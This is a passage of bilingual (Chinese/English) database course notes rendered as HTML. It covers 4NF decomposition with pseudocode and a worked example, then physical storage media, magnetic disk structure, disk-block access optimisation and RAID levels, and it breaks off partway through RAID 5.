<p>例如：如果原关系有依赖<span class="arithmatex">\(A \rightarrow B\)</span>，且<span class="arithmatex">\(A\)</span>和<span class="arithmatex">\(B\)</span>都在子关系<span class="arithmatex">\(R_i\)</span>中，则<span class="arithmatex">\(A \rightarrow B\)</span>会保留在<span class="arithmatex">\(D_i\)</span>中。</p>
<p>对于<span class="arithmatex">\(D^+\)</span>中的每个多值依赖<span class="arithmatex">\(\alpha \rightarrow\rightarrow \beta\)</span>：</p>
<p>如果<span class="arithmatex">\(\alpha\)</span>包含在<span class="arithmatex">\(R_i\)</span>中</p>
<p>则<span class="arithmatex">\(\alpha \rightarrow\rightarrow (\beta \cap R_i)\)</span>会被包含在<span class="arithmatex">\(D_i\)</span>中</p>
<p>这表示在子关系上，多值依赖的右侧被"裁剪"为只包含该子关系的属性</p>
<h3 id="note-db-lec7-algorithm-for-4nf-decomposition">Algorithm for 4NF Decomposition<a class="headerlink" href="#note-db-lec7-algorithm-for-4nf-decomposition" title="Permanent link">&para;</a></h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#note-db-lec7-__codelineno-7-1"></a>result := {R};        // 初始结果集包含原始关系R
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#note-db-lec7-__codelineno-7-2"></a>done := false;        // 设置循环继续标志
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#note-db-lec7-__codelineno-7-3"></a>compute D+;           // 计算依赖集D的闭包
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#note-db-lec7-__codelineno-7-4"></a>Let Di denote the restriction of D+ to Ri  // 确定D+对每个关系的限
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#note-db-lec7-__codelineno-7-5"></a>while (not done) {
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#note-db-lec7-__codelineno-7-6"></a>    // 检查result中是否存在不满足4NF的关系
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#note-db-lec7-__codelineno-7-7"></a>    if (存在关系Ri不满足4NF) {
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#note-db-lec7-__codelineno-7-8"></a>        // 找到一个违反4NF的多值依赖
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9" href="#note-db-lec7-__codelineno-7-9"></a>        选择非平凡多值依赖 α →→ β，使得:
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10" href="#note-db-lec7-__codelineno-7-10"></a>            - α不是Ri的超键
</span><span id="__span-7-11"><a id="__codelineno-7-11" name="__codelineno-7-11" href="#note-db-lec7-__codelineno-7-11"></a>            - α与β没有交集(α∩β=∅)
</span><span id="__span-7-12"><a id="__codelineno-7-12" name="__codelineno-7-12" href="#note-db-lec7-__codelineno-7-12"></a>
</span><span id="__span-7-13"><a id="__codelineno-7-13" name="__codelineno-7-13" href="#note-db-lec7-__codelineno-7-13"></a>        // 分解关系Ri
</span><span id="__span-7-14"><a id="__codelineno-7-14" name="__codelineno-7-14" href="#note-db-lec7-__codelineno-7-14"></a>        result := (result - Ri) ∪ (α, β) ∪ (Ri - β);
</span><span id="__span-7-15"><a id="__codelineno-7-15" name="__codelineno-7-15" href="#note-db-lec7-__codelineno-7-15"></a>    }
</span><span id="__span-7-16"><a id="__codelineno-7-16" name="__codelineno-7-16" href="#note-db-lec7-__codelineno-7-16"></a>    else {
</span><span id="__span-7-17"><a id="__codelineno-7-17" name="__codelineno-7-17" href="#note-db-lec7-__codelineno-7-17"></a>        done := true;  // 所有关系都满足4NF，算法结束
</span><span id="__span-7-18"><a id="__codelineno-7-18" name="__codelineno-7-18" href="#note-db-lec7-__codelineno-7-18"></a>    }
</span><span id="__span-7-19"><a id="__codelineno-7-19" name="__codelineno-7-19" href="#note-db-lec7-__codelineno-7-19"></a>}
</span></code></pre></div>
<div class="admonition example">
<p class="admonition-title">4NF分解示例</p>
<p>有关系模式 <span class="arithmatex">\(R = (A, B, C, G, H, I)\)</span></p>
<p>函数依赖和多值依赖集：</p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#note-db-lec7-__codelineno-8-1"></a>D = {A →→ B
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#note-db-lec7-__codelineno-8-2"></a>     B →→ HI
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#note-db-lec7-__codelineno-8-3"></a>     CG →→ H}
</span></code></pre></div>
<p>从中也可以推导出<span class="arithmatex">\(A \rightarrow\rightarrow H\)</span>,<span class="arithmatex">\(A \rightarrow\rightarrow I\)</span>$</p>
<p><span class="arithmatex">\(R\)</span> 不满足4NF，因为 <span class="arithmatex">\(A →→ B\)</span> 中 <span class="arithmatex">\(A\)</span> 不是超键。</p>
<p><strong>分解过程</strong>：</p>
<p>a) <span class="arithmatex">\(R_1 = (A, B)\)</span> (<span class="arithmatex">\(R_1\)</span> 满足4NF)</p>
<p>b) <span class="arithmatex">\(R_2 = (A, C, G, H, I)\)</span> (<span class="arithmatex">\(R_2\)</span> 不满足4NF,将其分解为<span class="arithmatex">\(R_3\)</span>和<span class="arithmatex">\(R_4\)</span>)</p>
<p>c) <span class="arithmatex">\(R_3 = (C, G, H)\)</span> (<span class="arithmatex">\(R_3\)</span> 满足4NF)</p>
<p>d) <span class="arithmatex">\(R_4 = (A, C, G, I)\)</span> (<span class="arithmatex">\(R_4\)</span> 不满足4NF,因为<span class="arithmatex">\(A →→ I\)</span>中<span class="arithmatex">\(A\)</span>不是超键)</p>
<p>e) <span class="arithmatex">\(R_5 = (A, I)\)</span> (<span class="arithmatex">\(R_5\)</span> 满足4NF)</p>
<p>f) <span class="arithmatex">\(R_6 = (A, C, G)\)</span> (<span class="arithmatex">\(R_6\)</span> 满足4NF)</p>
<p>最终的分解结果是：<span class="arithmatex">\(R_1\)</span>, <span class="arithmatex">\(R_3\)</span>, <span class="arithmatex">\(R_5\)</span>, <span class="arithmatex">\(R_6\)</span>，所有这些关系都满足4NF，并且分解是无损连接的。</p>
</div></section><section class="print-page" id="note-db-lec8" heading-number="2.2.1.7"><h1 id="note-db-lec8-storage-and-file-structure">Storage and File Structure<a class="headerlink" href="#note-db-lec8-storage-and-file-structure" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 8456 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 26 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 29 分钟</p>
</div>
<p>主要面临的问题有</p>
<ul>
<li><strong>Data Storage(数据存储)</strong> ：如何高效地存储和管理数据。</li>
<li><strong>API 应用程序接口 (SQL)</strong> ：提供标准化的接口，支持查询、插入、删除和更新操作。</li>
<li><strong>High Performance(高性能)</strong> ：通过索引、缓冲管理、查询处理和优化来提升数据库性能。</li>
<li><strong>Concurrent Control(并发控制)</strong> ：确保多个用户同时访问数据库时的一致性和正确性。</li>
<li><strong>Reliability(可靠性)</strong> ：在系统故障时，保证数据的完整性和可恢复性。</li>
<li><strong>Security(安全性)</strong> ：通过授权和加密机制保护数据免受未授权访问。</li>
</ul>
<h2 id="note-db-lec8-overview-of-physical-storage-media">Overview of Physical Storage Media<a class="headerlink" href="#note-db-lec8-overview-of-physical-storage-media" title="Permanent link">&para;</a></h2>
<h3 id="note-db-lec8-physical-level-of-databases">Physical Level of Databases<a class="headerlink" href="#note-db-lec8-physical-level-of-databases" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><strong>Files and Storage</strong> : 数据库在物理层面上存储为文件，例如 <code>.mdf</code>, <code>.ldf</code>, <code>.ora</code>, <code>.dbf</code> 等。</p>
</li>
<li>
<p><strong>Storage Media Classification</strong> :</p>
<ul>
<li><strong>Speed</strong>: 数据访问速度。</li>
<li><strong>Cost</strong>: 每单位数据的存储成本。</li>
<li><strong>Reliability</strong>:数据在断电或系统崩溃时可能丢失。存储设备的物理故障（如 RAID 提供的容错机制）。</li>
</ul>
</li>
</ul>
<p>Storages classified by reliability:</p>
<ul>
<li>Volatile storage: loses contents when power is switched off, e.g., DDR2, SDR. </li>
<li>Non-volatile storage(非易失性存储器): contents persist even when power is switched off. Includes secondary and tertiary storage, as well as batter-backed up main-memory. </li>
</ul>
<p>Storages classified by speed: 
- Cache 
- Main-memory 
- Flash memory
- Magnetic-disk 
- Optical storage 
- Tape storage</p>
<h3 id="note-db-lec8-hierarchy">Hierarchy<a class="headerlink" href="#note-db-lec8-hierarchy" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-1.png" width="400" />

<figcaption>Storage Hierarchy</figcaption>
</figure>
<ul>
<li>
<p>Primary storage: Fastest media but volatile (cache, main memory). </p>
</li>
<li>
<p>Secondary storage (辅助存储器，联机存储器): next level in hierarchy, non-volatile, moderately fast access time ;Also called on-line storage E.g., flash memory, magnetic disks </p>
</li>
<li>
<p>Tertiary storage (三级存储器，脱机存储器): lowest level in hierarchy, non-volatile, slow access time ;also called off-line storage,E.g., magnetic tape, optical storage</p>
</li>
</ul>
<h3 id="note-db-lec8-physical-storage-media-cont">Physical Storage Media (Cont.)<a class="headerlink" href="#note-db-lec8-physical-storage-media-cont" title="Permanent link">&para;</a></h3>
<h4 id="note-db-lec8-cache">Cache<a class="headerlink" href="#note-db-lec8-cache" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>Fastest and most costly form of storage</strong>, volatile, and managed by the computer system hardware.</li>
<li><strong>Speed</strong>: ≤ 0.5 nanoseconds (ns, 1 ns = 10⁻⁹ seconds).</li>
<li><strong>Size</strong>: ~ KB to ~ MB.</li>
</ul>
<h4 id="note-db-lec8-main-memory">Main Memory<a class="headerlink" href="#note-db-lec8-main-memory" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>Fast access</strong> : 10 to 100 ns.</li>
<li><strong>Capacity</strong> : Generally too small (or too expensive) to store the entire database.<ul>
<li>Widely used capacities: up to a few Gigabytes (1 GB = <span class="arithmatex">\(10^9\)</span> B).</li>
<li>Capacities have increased, and per-byte costs have decreased steadily (roughly a factor of 2 every 2–3 years).</li>
</ul>
</li>
<li><strong>Volatile</strong> : Contents are lost during power failure or system crash.</li>
</ul>
<h4 id="note-db-lec8-flash-memory">Flash Memory (快闪存储器)<a class="headerlink" href="#note-db-lec8-flash-memory" title="Permanent link">&para;</a></h4>
<ul>
<li>Also known as <strong>EEPROM</strong> (Electrically Erasable Programmable Read-Only Memory, 电可擦可编程只读存储器).</li>
<li><strong>Non-volatile</strong> : Data survives power failures.</li>
<li><strong>Write/Erase Limitations</strong> :<ul>
<li>Data can be written at a location only once, but the location can be erased and rewritten.</li>
<li>Supports a limited number of write/erase cycles (10K–1M).</li>
<li>Erasing must be done to an entire bank of memory.</li>
</ul>
</li>
<li><strong>Performance</strong> :<ul>
<li>Reads: Roughly as fast as main memory (&lt; 100 ns).</li>
<li>Writes: Slower (~10 μs), and erases are even slower.</li>
</ul>
</li>
<li><strong>Cost</strong> : Similar to main memory.</li>
<li><strong>Usage</strong> : Widely used in embedded devices such as digital cameras, phones, and USB keys.</li>
</ul>
<h4 id="note-db-lec8-magnetic-disk">Magnetic Disk<a class="headerlink" href="#note-db-lec8-magnetic-disk" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>Storage</strong> : Data is stored on spinning disks and read/written magnetically.</li>
<li><strong>Primary medium</strong> : Used for long-term storage, typically storing the entire database.</li>
<li><strong>Access</strong> :<ul>
<li>Data must be moved to main memory for access and written back for storage.</li>
<li>Much slower access than main memory.</li>
<li>Direct-access: Data can be read in any order (unlike magnetic tape).</li>
</ul>
</li>
<li><strong>Capacity</strong> :<ul>
<li>Ranges up to ~1.5 TB (as of 2009).</li>
<li>Larger capacity and lower cost/byte than main memory or flash memory.</li>
<li>Growing rapidly with technology improvements (factor of 2–3 every 2 years).</li>
</ul>
</li>
<li><strong>Reliability</strong> :<ul>
<li>Survives power failures and system crashes.</li>
<li>Disk failure is rare but can destroy data.</li>
</ul>
</li>
</ul>
<h4 id="note-db-lec8-optical-storage">Optical Storage<a class="headerlink" href="#note-db-lec8-optical-storage" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>Non-volatile</strong> : Data is read optically from a spinning disk using a laser.</li>
<li><strong>Popular Forms</strong> :<ul>
<li>CD-ROM (640 MB).</li>
<li>DVD (4.7–17 GB).</li>
</ul>
</li>
<li><strong>Write Types</strong> :<ul>
<li>Write-once, read-many (WORM) disks (e.g., CD-R, DVD-R) for archival storage.</li>
<li>Multiple-write versions available (e.g., CD-RW, DVD-RW, DVD-RAM).</li>
</ul>
</li>
<li><strong>Performance</strong> :<ul>
<li>Reads and writes are slower than magnetic disks.</li>
</ul>
</li>
<li><strong>Juke-box Systems(自动光盘机)</strong> :<ul>
<li>Large numbers of removable disks with a few drives.</li>
<li>Mechanism for automatic loading/unloading of disks for storing large volumes of data.</li>
</ul>
</li>
</ul>
<h4 id="note-db-lec8-tape-storage">Tape Storage<a class="headerlink" href="#note-db-lec8-tape-storage" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>非易失性</strong> ：主要用于备份（从磁盘故障中恢复）和归档数据。</li>
<li><strong>顺序访问</strong> ：访问速度远慢于磁盘。</li>
<li><strong>容量</strong> ：容量非常高（40 到 300 GB 的磁带可用）。</li>
<li><strong>可移除</strong> ：磁带可以从驱动器中移除，因此存储成本远低于磁盘，但驱动器价格昂贵。</li>
<li><strong>磁带自动机 (Tape Jukebox)</strong> ：<ul>
<li>可用于存储海量数据。</li>
<li>容量范围从数百 TB（1 TB = <span class="arithmatex">\(10^{12}\)</span> 字节）到甚至 PB（1 PB = <span class="arithmatex">\(10^{15}\)</span> 字节）。</li>
</ul>
</li>
</ul>
<h2 id="note-db-lec8-magnetic-disks">Magnetic Disks<a class="headerlink" href="#note-db-lec8-magnetic-disks" title="Permanent link">&para;</a></h2>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-2.png" width="400" />

<figcaption>
Structure
</figcaption>
</figure>
<h3 id="note-db-lec8-disk-structure">Disk Structure<a class="headerlink" href="#note-db-lec8-disk-structure" title="Permanent link">&para;</a></h3>
<p>磁头 (Read-Write Head)</p>
<ul>
<li><strong>位置</strong>：磁头非常接近盘片表面（几乎接触）。</li>
<li><strong>功能</strong>：用于读取或写入磁性编码的信息。</li>
</ul>
<p>盘片表面 (Surface of Platter)</p>
<ul>
<li>
<p><strong>圆形磁道 (Tracks)</strong>：</p>
<ul>
<li>盘片表面被划分为多个圆形磁道。</li>
<li>典型硬盘每个盘片上有超过 50K–100K 条磁道。</li>
</ul>
</li>
<li>
<p><strong>扇区 (Sectors)</strong>：</p>
<ul>
<li>每个磁道被划分为多个扇区。</li>
<li>扇区是可以读取或写入的最小数据单位。</li>
</ul>
</li>
<li>
<p><strong>扇区大小</strong>：通常为 512 字节。</p>
</li>
<li>
<p><strong>每磁道的扇区数</strong>：</p>
<ul>
<li>内圈磁道：500 到 1000 个扇区。</li>
<li>外圈磁道：1000 到 2000 个扇区。</li>
</ul>
</li>
</ul>
<p>读/写扇区 (To Read/Write a Sector)</p>
<ul>
<li><strong>磁臂 (Disk Arm)</strong>：</li>
<li>磁臂移动以将磁头定位到正确的磁道上。</li>
<li><strong>盘片旋转 (Platter Spins)</strong>：</li>
<li>盘片持续旋转，当扇区经过磁头下方时，数据被读取或写入。</li>
</ul>
<p>磁头-磁盘组件 (Head-Disk Assemblies)</p>
<ul>
<li><strong>多盘片 (Multiple Disk Platters)</strong>：</li>
<li>单个主轴上通常有 4 到 16 个盘片。</li>
<li><strong>磁头 (Heads)</strong>：</li>
<li>每个盘片对应一个磁头，所有磁头安装在一个公共磁臂上。</li>
<li><strong>柱面 (Cylinder)</strong>：</li>
<li>第 i 个柱面由所有盘片的第 i 个磁道组成。</li>
</ul>
<p>磁盘控制器 (Disk Controller)</p>
<ul>
<li><strong>功能</strong>：<ul>
<li>作为计算机系统与磁盘驱动硬件之间的接口。</li>
<li>接收高层次的读/写扇区命令。</li>
<li>执行动作，例如移动磁臂到正确的磁道并实际读取或写入数据。</li>
</ul>
</li>
<li><strong>校验和 (Checksum)</strong>：<ul>
<li>计算并附加校验和到每个扇区，以验证数据是否正确读取。</li>
<li>如果数据损坏，存储的校验和与重新计算的校验和很可能不匹配。</li>
</ul>
</li>
<li><strong>写入验证 (Write Verification)</strong>：<ul>
<li>写入后通过读取扇区来确保写入成功。</li>
</ul>
</li>
<li><strong>坏扇区重映射 (Bad Sector Remapping)</strong>：<ul>
<li>将坏扇区从逻辑地址映射到预留的物理扇区。</li>
<li>重映射信息记录在磁盘或其他非易失性存储器中。</li>
</ul>
</li>
</ul>
<p>磁盘的性能主要由以下几个方面决定：</p>
<ul>
<li>转速（RPM）：盘片的旋转速度，转速越高，数据访问速度越快。</li>
<li>磁头寻道时间（Seek Time）：磁头移动到目标轨道所需的时间，寻道时间越短，数据访问速度越快。</li>
<li>数据传输率（Data Transfer Rate）：硬盘与计算机之间的数据传输速度，传输率越高，数据访问速度越快。</li>
<li>缓存（Cache）：硬盘内部的高速缓存，用于临时存储数据，提高数据传输效率。</li>
</ul>
<div class="admonition quote">
<p class="admonition-title">Quote</p>
<p><a href="#note-co-wk6">计组关于磁盘性能的描述</a></p>
</div>
<h3 id="note-db-lec8-optimization-of-disk-block-access">Optimization of Disk-Block Access<a class="headerlink" href="#note-db-lec8-optimization-of-disk-block-access" title="Permanent link">&para;</a></h3>
<h4 id="note-db-lec8-block">Block<a class="headerlink" href="#note-db-lec8-block" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>定义</strong>：来自单个磁道的连续扇区序列。</li>
<li><strong>数据传输</strong>：数据在磁盘和主存之间以块为单位传输。</li>
<li><strong>块大小</strong>：<ul>
<li>范围从 512 字节到几千字节。</li>
<li><strong>小块</strong>：需要更多的磁盘传输。</li>
<li><strong>大块</strong>：可能浪费更多空间（由于部分填充的块）。</li>
<li><strong>典型块大小</strong>：目前范围为 4 到 16 KB。</li>
</ul>
</li>
</ul>
<h4 id="note-db-lec8-disk-arm-scheduling-algorithms">Disk-Arm-Scheduling Algorithms<a class="headerlink" href="#note-db-lec8-disk-arm-scheduling-algorithms" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-3.png" width="400" />
</figure>
<ul>
<li><strong>目标</strong>：对磁盘访问请求进行排序，以最小化磁盘臂的移动。</li>
<li><strong>电梯算法 (Elevator Algorithm)</strong>：<ul>
<li>磁盘臂向一个方向移动（从外圈到内圈或反之），处理该方向上的下一个请求。</li>
<li>当该方向没有更多请求时，反转方向并重复。</li>
</ul>
</li>
</ul>
<h4 id="note-db-lec8-file-organization">File Organization<a class="headerlink" href="#note-db-lec8-file-organization" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>优化块访问时间</strong>：通过组织块的位置，使其与数据访问方式相对应。<ul>
<li>例如，将相关信息存储在同一个柱面或附近的柱面上。</li>
</ul>
</li>
<li><strong>文件碎片化</strong>：<ul>
<li>随着文件中数据的插入或删除，文件可能会变得碎片化。</li>
<li>如果磁盘上的空闲块分散，新创建的文件可能会被分散存储。</li>
<li>对碎片化文件的顺序访问会导致磁盘臂移动增加。</li>
</ul>
</li>
<li><strong>碎片整理工具</strong>：<ul>
<li>一些系统提供碎片整理工具以加速文件访问。</li>
<li>但在运行这些工具时，系统通常无法使用。</li>
</ul>
</li>
</ul>
<h4 id="note-db-lec8-nonvolatile-write-buffers">非易失性写缓冲区 (Nonvolatile Write Buffers)<a class="headerlink" href="#note-db-lec8-nonvolatile-write-buffers" title="Permanent link">&para;</a></h4>
<ul>
<li>
<p><strong>作用</strong>：通过将块立即写入非易失性 RAM 缓冲区来加速磁盘写入。</p>
</li>
<li>
<p><strong>非易失性 RAM</strong>：</p>
<ul>
<li>由电池供电的 RAM 或闪存组成。</li>
<li>即使断电，数据仍然安全，并将在电力恢复后写入磁盘。</li>
</ul>
</li>
<li><strong>控制器行为</strong>：<ul>
<li>当磁盘没有其他请求或请求等待了一段时间时，控制器将数据写入磁盘。</li>
<li>数据库操作可以在数据写入磁盘之前继续运行。</li>
<li>写入可以重新排序以最小化磁盘臂移动。</li>
</ul>
</li>
</ul>
<h4 id="note-db-lec8-log-disk">日志磁盘 (Log Disk)<a class="headerlink" href="#note-db-lec8-log-disk" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>定义</strong>：专门用于写入块更新日志的磁盘。</li>
<li><strong>特点</strong>：<ul>
<li>写入日志磁盘非常快，因为不需要寻道。</li>
<li>不需要特殊硬件（如非易失性 RAM）。</li>
</ul>
</li>
<li><strong>文件系统行为</strong>：<ul>
<li>日志文件系统以安全顺序将数据写入非易失性 RAM 或日志磁盘。</li>
<li>如果没有日志记录，重新排序写入可能会导致文件系统数据损坏。</li>
</ul>
</li>
</ul>
<h2 id="note-db-lec8-raid">RAID<a class="headerlink" href="#note-db-lec8-raid" title="Permanent link">&para;</a></h2>
<blockquote>
<p>Redundant Array of Inexpensive Disks
RAID 最初是作为一种成本较低的替代方案，用于替代大型昂贵的磁盘。<br />
RAID 中的 "I" 最初代表 "inexpensive"（廉价）。<br />
如今，RAID 被视为 "independent"（独立的）。</p>
</blockquote>
<div class="admonition info">
<p class="admonition-title">Info</p>
<p>Disk organization techniques that manage a large numbers of disks, providing a view of a single disk of </p>
<p>•High capacity and high speed  by using multiple disks in parallel, and </p>
<p>•High reliability by storing data redundantly, so that data can be recovered even if  a disk fails </p>
</div>
<p><strong>The chance that some disk out of a set of N disks will fail is much higher than the chance that a specific single disk will fail</strong></p>
<div class="admonition eg">
<p class="admonition-title">Eg</p>
<p>a system with 100 disks, each with MTTF of 100,000 hours (approx.  11 years), will have a system MTTF of 1000 hours (approx. 41 days) </p>
<p>Techniques for using redundancy to avoid data loss are critical with large numbers of disks </p>
</div>
<h3 id="note-db-lec8-reliability-improvement">Reliability improvement<a class="headerlink" href="#note-db-lec8-reliability-improvement" title="Permanent link">&para;</a></h3>
<ul>
<li>
<p><strong>冗余原理</strong> ：存储额外的信息，用于在磁盘故障时重建丢失的数据</p>
</li>
<li>
<p><strong>镜像(Mirroring)技术</strong> ：</p>
<ul>
<li>每个磁盘都有一个完整的副本</li>
<li>一个逻辑磁盘实际由两个物理磁盘组成</li>
<li>每次写操作都在两个磁盘上执行</li>
<li>读操作可以从任一磁盘进行</li>
</ul>
</li>
<li>
<p><strong>故障恢复</strong> ：</p>
<ul>
<li>单个磁盘故障时，数据仍可从镜像磁盘获取</li>
<li>只有当磁盘及其镜像磁盘在系统修复前都发生故障时才会丢失数据</li>
<li>这种双重故障的概率非常小</li>
<li>需注意依赖性故障模式(如火灾、建筑物倒塌或电涌)</li>
</ul>
</li>
<li>
<p><strong>平均数据丢失时间</strong> ：</p>
<ul>
<li>取决于平均故障时间(MTTF)和平均修复时间</li>
<li>示例：</li>
<li>MTTF = 100,000小时</li>
<li>平均修复时间 = 10小时</li>
<li>镜像磁盘对的平均数据丢失时间 = 500 <span class="arithmatex">\(\times\)</span> <span class="arithmatex">\(10^6\)</span>小时(约57,000年)</li>
<li>(计算公式：<span class="arithmatex">\(100000^2\)</span>/(2 <span class="arithmatex">\(\times\)</span> 10))</li>
</ul>
</li>
</ul>
<h3 id="note-db-lec8-performance-improvement">Performance improvement<a class="headerlink" href="#note-db-lec8-performance-improvement" title="Permanent link">&para;</a></h3>
<ul>
<li><strong>并行化的主要目标</strong> ：</li>
<li>负载均衡：通过处理多个小访问提高吞吐量</li>
<li>
<p>并行化大型访问以减少响应时间</p>
</li>
<li>
<p><strong>数据条带化(Striping)技术</strong> ：</p>
</li>
</ul>
<p>1 <strong>比特级条带化</strong> ：</p>
<ul>
<li>将每个字节的位分散到多个磁盘</li>
<li>示例：在8个磁盘阵列中，每个字节的第i位写入第i个磁盘</li>
<li>可实现8倍于单磁盘的数据读取速率</li>
<li>缺点：寻道/访问时间比单磁盘更差</li>
<li>现在较少使用</li>
</ul>
<p>2 <strong>块级条带化</strong> ：</p>
<ul>
<li>在n个磁盘中，文件的第i个块存储在第((i mod n) + 1)个磁盘上</li>
<li>不同块的请求可以在不同磁盘上并行运行</li>
<li>长序列块的请求可以并行使用所有磁盘</li>
</ul>
<h3 id="note-db-lec8-raid-levels">RAID levels<a class="headerlink" href="#note-db-lec8-raid-levels" title="Permanent link">&para;</a></h3>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-4.png" width="400" />

<figcaption>
RAID 0 and RAID 1
</figcaption>
</figure>
<h4 id="note-db-lec8-raid-level-0">RAID Level 0<a class="headerlink" href="#note-db-lec8-raid-level-0" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>块级条带化</strong> ：不具备冗余性。</li>
<li><strong>应用场景</strong> ：用于高性能应用，数据丢失不关键。</li>
<li><strong>工作原理</strong> ：使用块级条带化，将数据分散到多个磁盘上。没有冗余，因此数据丢失风险较高。</li>
<li><strong>优点</strong> ：提供高数据传输速率，适用于对性能要求高但数据安全性要求不高的应用。</li>
</ul>
<h4 id="note-db-lec8-raid-level-1">RAID Level 1<a class="headerlink" href="#note-db-lec8-raid-level-1" title="Permanent link">&para;</a></h4>
<ul>
<li><strong>镜像磁盘与块级条带化</strong> ：提供最佳性能。</li>
<li><strong>应用场景</strong> ：常用于数据库系统中的日志文件存储。</li>
<li><strong>工作原理</strong> ：使用镜像技术，每个磁盘都有一个完整的副本。所有写操作都在两个磁盘上执行，读操作可以从任一磁盘进行。</li>
<li><strong>优点</strong> ：提供高数据安全性和读取性能，适用于需要高可靠性的数据存储。</li>
</ul>
<h4 id="note-db-lec8-raid-level-2">RAID Level 2<a class="headerlink" href="#note-db-lec8-raid-level-2" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-5.png" width="400" />

<figcaption>
RAID 2
</figcaption>
</figure>
<ul>
<li>
<p><strong>Memory-Style Error-Correcting-Codes (ECC)与比特级条带化</strong> 。</p>
</li>
<li>
<p><strong>工作原理</strong> ：使用内存风格的错误校正码(ECC)和比特级条带化。数据被分成位并分布在多个磁盘上，ECC用于错误检测和校正。</p>
</li>
<li><strong>优点</strong> ：提供错误校正能力，但实现复杂且成本较高。</li>
</ul>
<h4 id="note-db-lec8-raid-level-3">RAID Level 3<a class="headerlink" href="#note-db-lec8-raid-level-3" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-6.png" width="400" />

<figcaption>
RAID 3
</figcaption>
</figure>
<ul>
<li><strong>比特交错奇偶校验</strong> ：<ul>
<li>单个奇偶位足以进行错误校正。</li>
<li>写入数据时，需计算并写入相应的奇偶位。</li>
<li>数据恢复通过计算其他磁盘（包括奇偶位磁盘）的位的异或。</li>
<li>数据传输速度快于单个磁盘，但每个I/O需要所有磁盘参与。</li>
</ul>
</li>
<li><strong>工作原理</strong> ：使用比特交错奇偶校验。一个奇偶位磁盘用于错误校正。写入数据时，需计算并写入相应的奇偶位。</li>
<li><strong>优点</strong> ：提供快速的数据传输速率，适用于需要高吞吐量的应用。</li>
</ul>
<h4 id="note-db-lec8-raid-level-4">RAID Level 4<a class="headerlink" href="#note-db-lec8-raid-level-4" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-7.png" width="400" />

<figcaption>
RAID 4
</figcaption>
</figure>
<ul>
<li><strong>块交错奇偶校验</strong> ：<ul>
<li>使用块级条带化，并在单独的磁盘上保存奇偶校验块。</li>
<li>写入数据块时，需计算并写入相应的奇偶校验块。</li>
<li>数据恢复通过计算其他磁盘（包括奇偶校验块）的块的异或。</li>
</ul>
</li>
<li><strong>工作原理</strong>：使用块交错奇偶校验。数据块和奇偶校验块分布在不同的磁盘上。</li>
<li><strong>优点</strong>：提供数据冗余和错误校正能力，但奇偶校验磁盘可能成为瓶颈。</li>
</ul>
<h4 id="note-db-lec8-raid-level-5">RAID Level 5<a class="headerlink" href="#note-db-lec8-raid-level-5" title="Permanent link">&para;</a></h4>
<figure>
<img alt="" src="../NOTE/DB/img/lec8-8.png" width="400" />

<figcaption>
RAID 5
</figcaption>
</figure>
<ul>
<li>
<p><strong>块交错分布式奇偶校验</strong> ：</p>
<ul>
<li>数据和奇偶校验分布在所有N+1个磁盘上。</li>
